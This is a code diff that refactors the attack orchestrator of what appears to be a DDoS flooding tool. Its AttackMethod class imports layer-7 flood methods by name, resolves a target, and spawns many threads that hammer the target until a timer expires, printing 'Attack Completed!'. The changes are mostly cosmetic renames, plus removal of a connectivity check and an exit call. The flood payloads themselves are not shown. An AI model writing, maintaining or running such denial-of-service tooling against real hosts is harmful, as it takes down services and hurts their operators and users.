@@ -1,16 +1,17 @@
 import sys
 from threading import Thread
 from time import sleep, time
+from typing import Callable
 
 from colorama import Fore
 from humanfriendly import Spinner, format_timespan
 
 from tools.crash import CriticalError
-from tools.ipTools import GetTargetAddress, InternetConnectionCheck
+from tools.ip_tools import get_target_address
 
 
 # Returns the flood method attack
-def GetMethodByName(method):
+def get_method_by_name(method: str) -> Callable:
 
     dir = f"tools.L7.{method.lower()}"
     module = __import__(dir, fromlist=["object"])
@@ -32,9 +33,8 @@ class AttackMethod:
 
     # Entry-point
     def __enter__(self):
-        InternetConnectionCheck()
-        self.method = GetMethodByName(self.method_name)
-        self.target = GetTargetAddress(self.target)
+        self.method = get_method_by_name(self.method_name)
+        self.target = get_target_address(self.target)
         return self
 
     # Exit-point
@@ -42,27 +42,27 @@ class AttackMethod:
         pass
 
     # Verifies the execution time
-    def __RunTimer(self):
+    def __run_timer(self):
         __stopTime = time() + self.duration
         while time() < __stopTime:
             sleep(1)
         self.is_running = False
 
     # Starts the flooder
-    def __RunFlood(self):
+    def __run_flood(self):
         while self.is_running:
             self.method(self.target)
 
     # Starts the threads
-    def __RunThreads(self):
+    def __run_threads(self):
 
         # Starts threads timing
-        timing = Thread(target=self.__RunTimer)
+        timing = Thread(target=self.__run_timer)
         timing.start()
 
         # Creates the threads flood
         for _ in range(self.threads_count):
-            thread = Thread(target=self.__RunFlood)
+            thread = Thread(target=self.__run_flood)
             self.threads.append(thread)
 
         # Starts the threads flood
@@ -82,10 +82,9 @@ class AttackMethod:
             )
 
         print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Completed!{Fore.RESET}")
-        sys.exit(0)
 
     # Starts DDOS attack
-    def Start(self):
+    def start(self):
         target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
@@ -96,7 +95,7 @@ class AttackMethod:
         self.is_running = True
 
         try:
-            self.__RunThreads()
+            self.__run_threads()
 
         except KeyboardInterrupt:
             self.is_running = False
@@ -114,3 +113,6 @@ class AttackMethod:
 
         except Exception as err:
             CriticalError("An error ocurred during the attack", err)
+
+        else:
+            return True
